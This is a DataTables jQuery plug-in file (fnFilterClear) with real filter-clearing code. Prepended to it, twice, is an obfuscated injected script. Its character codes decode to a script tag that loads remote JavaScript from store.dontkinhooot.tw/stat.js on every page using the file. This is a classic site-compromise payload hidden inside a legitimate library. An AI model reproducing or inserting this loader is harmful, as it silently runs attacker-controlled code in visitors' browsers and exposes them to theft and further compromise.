Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Remove all filtering that has been applied to a DataTable, be it column
 * based filtering or global filtering.
 *
 * DataTables 1.10+ new API can achieve the same effect as this plug-in, without
 * the requirement for plug-ins using the following chaining:
 *
 * ```js
 * var table = $('#example').DataTable();
 * table
 *   .search( '' )
 *   .columns().search( '' )
 *   .draw();
 * ```
 *
 * Please use the new API in DataTables 1.10+ is you are able to do so.
 *
 *  @name fnFilterClear
 *  @summary Remove all column and global filters applied to a table
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *  @deprecated
 *
 *  @example
 *    $(document).ready(function() {
 *        var table = $('#example').dataTable();
 *         
 *        // Perform a filter
 *        table.fnFilter('Win');
 *        table.fnFilter('Trident', 0);
 *         
 *        // Remove all filtering
 *        table.fnFilterClear();
 *    } );
 */

jQuery.fn.dataTableExt.oApi.fnFilterClear  = function ( oSettings )
{
	var i, iLen;

	/* Remove global filter */
	oSettings.oPreviousSearch.sSearch = "";

	/* Remove the text of the global filter in the input boxes */
	if ( typeof oSettings.aanFeatures.f != 'undefined' )
	{
		var n = oSettings.aanFeatures.f;
		for ( i=0, iLen=n.length ; i<iLen ; i++ )
		{
			$('input', n[i]).val( '' );
		}
	}

	/* Remove the search text for the column filters - NOTE - if you have input boxes for these
	 * filters, these will need to be reset
	 */
	for ( i=0, iLen=oSettings.aoPreSearchCols.length ; i<iLen ; i++ )
	{
		oSettings.aoPreSearchCols[i].sSearch = "";
	}

	/* Redraw */
	oSettings.oApi._fnReDraw( oSettings );
};
